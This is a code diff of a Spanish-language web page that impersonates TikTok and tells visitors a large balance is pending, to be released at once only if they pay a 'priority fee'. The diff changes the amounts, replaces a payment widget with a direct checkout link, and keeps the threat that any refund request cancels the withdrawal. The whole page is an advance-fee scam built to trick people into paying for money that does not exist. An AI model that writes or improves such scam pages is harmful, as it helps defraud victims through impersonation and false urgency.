@@ -28,12 +28,11 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
         <script src="https://cdn.tailwindcss.com"></script>
     <style>@import "https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap";body{letter-spacing:-.02em;background-color:#fff;font-family:Inter,sans-serif}.clock-base{background:#fff;border:6px solid #161823;border-radius:50%;justify-content:center;align-items:center;width:80px;height:80px;display:flex;position:relative;box-shadow:0 4px 15px #0000001a}.clock-center{z-index:10;background:#fe2c55;border-radius:50%;width:8px;height:8px}.hand{transform-origin:bottom;background:#161823;border-radius:10px;position:absolute;bottom:50%;left:calc(50% - 2px)}.hour-hand{width:4px;height:20px;animation:12s linear infinite rotate-clock}.minute-hand{background:#fe2c55;width:3px;height:28px;animation:2s linear infinite rotate-clock}@keyframes rotate-clock{0%{transform:rotate(0)}to{transform:rotate(360deg)}}.btn-tiktok{background-color:#fe2c55;flex-direction:column;justify-content:center;align-items:center;gap:.2rem;line-height:1.15;transition:all .2s;display:flex}.btn-tiktok:active{transform:scale(.96)}.btn-tiktok-line{display:block}.btn-tiktok-line-sub{letter-spacing:.03em;opacity:.95;font-size:.9em}.btn-tiktok-amount{white-space:nowrap}.premium-card{background:linear-gradient(135deg,#161823 0%,#292d3e 100%)}details summary::-webkit-details-marker{display:none}.progress-bar{background:#fe2c55;animation:3s cubic-bezier(.65,0,.35,1) forwards fill}@keyframes fill{0%{width:0%}to{width:99%}}</style>
-    <link rel="stylesheet" href="/css/vp-upsell-cover.css">
 </head>
 <body class="text-[#161823]">
 
     <div class="bg-black text-white text-center py-3 px-4 text-[11px] font-bold uppercase tracking-tight leading-tight w-full sticky top-0 z-50">
-        Tus MX$17,131.75 están pendientes. Sin la comisión prioritaria, la transferencia puede tardar hasta 180 días.
+        Tus $9.870,20 MXN están pendientes. Sin la comisión prioritaria, la transferencia puede tardar hasta 180 días.
     </div>
 
     <div class="max-w-md mx-auto min-h-screen relative bg-white pb-10">
@@ -42,7 +41,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
             <img src="/images/tiktok-logo.png" alt="TikTok Logo" class="h-20 w-20 object-contain mb-4">
             <div class="text-center">
                 <span class="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Saldo en proceso</span>
-                <span class="block text-4xl font-black text-[#161823] leading-none tracking-tighter whitespace-nowrap">MX$17,131.75</span>
+                <span class="block text-4xl font-black text-[#161823] leading-none tracking-tighter whitespace-nowrap">$9.870,20 MXN</span>
                 <span class="inline-block mt-2 bg-amber-50 text-amber-700 border border-amber-200 text-[10px] font-black px-3 py-1 rounded-full uppercase tracking-widest">En fila del banco</span>
             </div>
         </div>
@@ -50,7 +49,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
         <div class="px-5 py-8">
             <div class="text-center mb-8">
                 <h1 class="text-2xl font-black text-slate-800 mb-2 italic text-center">¡RETIRO SOLICITADO!</h1>
-                <p class="text-sm text-gray-500 font-medium mb-6">Tu saldo de <strong>MX$17,131.75</strong> está validado, pero la transferencia sigue el plazo estándar — hasta <strong>180 días</strong>. Paga la comisión prioritaria para recibirlo <strong>de inmediato</strong>.</p>
+                <p class="text-sm text-gray-500 font-medium mb-6">Tu saldo de <strong>$9.870,20 MXN</strong> está validado, pero la transferencia sigue el plazo estándar — hasta <strong>180 días</strong>. Paga la comisión prioritaria para recibirlo <strong>de inmediato</strong>.</p>
 
                 <div class="flex justify-center items-center mb-6">
                     <div class="clock-base">
@@ -76,17 +75,23 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
             <div class="space-y-6">
                 <div class="bg-gray-50 border-l-4 border-[#25F4EE] p-5 rounded-r-lg shadow-sm">
                     <p class="text-[15px] text-gray-800 leading-relaxed text-center">
-                        ⚡ <strong>Procesamiento prioritario:</strong> Sáltate la fila y recibe hoy mismo tus <strong class="text-[#FE2C55] whitespace-nowrap">MX$17,131.75</strong> en tu cuenta.
+                        ⚡ <strong>Procesamiento prioritario:</strong> Sáltate la fila y recibe hoy mismo tus <strong class="text-[#FE2C55] whitespace-nowrap">$9.870,20 MXN</strong> en tu cuenta.
                     </p>
                 </div>
 
-                <div class="w-full max-w-md mx-auto">
-                    <div id="vendepay-upsell-container"></div>
+                                <div class="w-full max-w-md mx-auto">
+                    <a
+                      id="upsell-checkout-btn"
+                      href="https://xpag.global/pay/lCYJVvLm"
+                      data-checkout="1"
+                      class="flex w-full items-center justify-center rounded-full bg-[#FE2C55] px-6 py-4 text-[15px] font-black uppercase tracking-wide text-white shadow-lg shadow-[#FE2C55]/30 transition active:scale-[0.98]"
+                    >
+                      Activar prioridad · $349,00 MXN
+                    </a>
+                    <a href="/mx/up3/" class="mt-3 block text-center text-[12px] font-semibold text-gray-400 underline-offset-2 hover:underline">
+                      Continuar sin prioridad
+                    </a>
                 </div>
-                <script src="https://widget.vendepay.com/upsell-widget/v1/vendepay-upsell-widget-1.0.16.js?upsellId=e2d47b52-d5dc-48b4-b110-93ef18b52bc8"
-                        onload="window.VendepayUpsellWidget && window.VendepayUpsellWidget.showIframe('vendepay-upsell-container')">
-                </script>
-                <script src="/js/vp-upsell-cover.js"></script>
 
                 <p class="text-center text-[11px] text-gray-500 font-medium">Comisión prioritaria — transferencia liberada en menos de 5 minutos</p>
 
@@ -94,17 +99,17 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
                     <div class="space-y-3 mb-6 px-1">
                         <div class="flex justify-between text-[13px]">
                             <span class="text-gray-500">Saldo pendiente:</span>
-                            <span class="font-bold whitespace-nowrap">MX$17,131.75</span>
+                            <span class="font-bold whitespace-nowrap">$9.870,20 MXN</span>
                         </div>
                         <div class="flex justify-between text-[13px] pt-2 border-t border-gray-100">
                             <span class="text-gray-500 italic">Comisión prioritaria:</span>
-                            <span class="font-bold text-[#FE2C55] whitespace-nowrap" id="upsellValue">MX$560.05</span>
+                            <span class="font-bold text-[#FE2C55] whitespace-nowrap" id="upsellValue">$349,00 MXN</span>
                         </div>
                     </div>
 
                     <div class="border border-gray-100 rounded-2xl p-5 flex flex-col items-center bg-gray-50">
                         <span class="text-[11px] uppercase font-black text-gray-400 mb-1 text-center">Total a recibir hoy en tu cuenta:</span>
-                        <span class="text-4xl font-[900] text-[#161823] tracking-tighter text-center whitespace-nowrap">MX$17,131.75</span>
+                        <span class="text-4xl font-[900] text-[#161823] tracking-tighter text-center whitespace-nowrap">$9.870,20 MXN</span>
                         <div class="mt-2 text-[10px] text-[#25F4EE] font-black tracking-widest uppercase text-center leading-tight bg-black px-3 py-1 rounded-full">Transferencia inmediata desbloqueada</div>
                         <p class="text-[10px] text-gray-400 mt-3 text-center font-medium">SPEI · PayPal · Mercado Pago</p>
                     </div>
@@ -132,7 +137,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
                     <span class="text-[12px] font-black uppercase tracking-wider text-[#FE2C55]">Información importante</span>
                 </div>
                 <p class="text-[13px] text-gray-700 leading-relaxed">
-                    Sin la comisión prioritaria, tu transferencia de <strong>MX$17,131.75</strong> se queda en la fila (hasta 180 días). <strong>Cualquier solicitud de reembolso</strong> provoca la <strong>cancelación inmediata del retiro</strong>.
+                    Sin la comisión prioritaria, tu transferencia de <strong>$9.870,20 MXN</strong> se queda en la fila (hasta 180 días). <strong>Cualquier solicitud de reembolso</strong> provoca la <strong>cancelación inmediata del retiro</strong>.
                 </p>
             </div>
 
@@ -140,20 +145,20 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
                 <p class="text-[11px] text-gray-400 font-bold uppercase tracking-widest">Preguntas frecuentes</p>
                 <details class="group bg-gray-50 rounded-xl border border-gray-100 text-left">
                     <summary class="flex justify-between items-center p-4 cursor-pointer font-bold text-sm">
-                        ¿Por qué pagar MX$560.05 para recibir MX$17,131.75?
+                        ¿Por qué pagar $349,00 MXN para recibir $9.870,20 MXN?
                         <span class="text-[#FE2C55] group-open:rotate-45 transition-transform text-xl">+</span>
                     </summary>
                     <div class="px-4 pb-4 text-sm text-gray-500 leading-relaxed">
-                        Los <strong>MX$17,131.75</strong> están validados, pero todavía no se enviaron a tu cuenta. La comisión prioritaria saca tu solicitud de la fila estándar y activa una transferencia inmediata.
+                        Los <strong>$9.870,20 MXN</strong> están validados, pero todavía no se enviaron a tu cuenta. La comisión prioritaria saca tu solicitud de la fila estándar y activa una transferencia inmediata.
                     </div>
                 </details>
                 <details class="group bg-gray-50 rounded-xl border border-gray-100 text-left">
                     <summary class="flex justify-between items-center p-4 cursor-pointer font-bold text-sm">
-                        ¿Por qué no descontar MX$560.05 del saldo?
+                        ¿Por qué no descontar $349,00 MXN del saldo?
                         <span class="text-[#FE2C55] group-open:rotate-45 transition-transform text-xl">+</span>
                     </summary>
                     <div class="px-4 pb-4 text-sm text-gray-500 leading-relaxed">
-                        Tu saldo de TikTok y tu cuenta bancaria están separados. No podemos descontar un monto que todavía no se transfirió. Los <strong>MX$560.05</strong> autorizan la transferencia de <strong>MX$17,131.75</strong>.
+                        Tu saldo de TikTok y tu cuenta bancaria están separados. No podemos descontar un monto que todavía no se transfirió. Los <strong>$349,00 MXN</strong> autorizan la transferencia de <strong>$9.870,20 MXN</strong>.
                     </div>
                 </details>
                 <details class="group bg-gray-50 rounded-xl border border-gray-100 text-left">
@@ -173,7 +178,6 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
         </footer>
     </div>
 
-    <script>window.COOUD_PP_NEXT = '/mx/up3/';</script>
-    <script src="/cooud-oneclick.js"></script>
+    <script src="/js/funnel-track.js" defer></script>
 </body>
 </html>
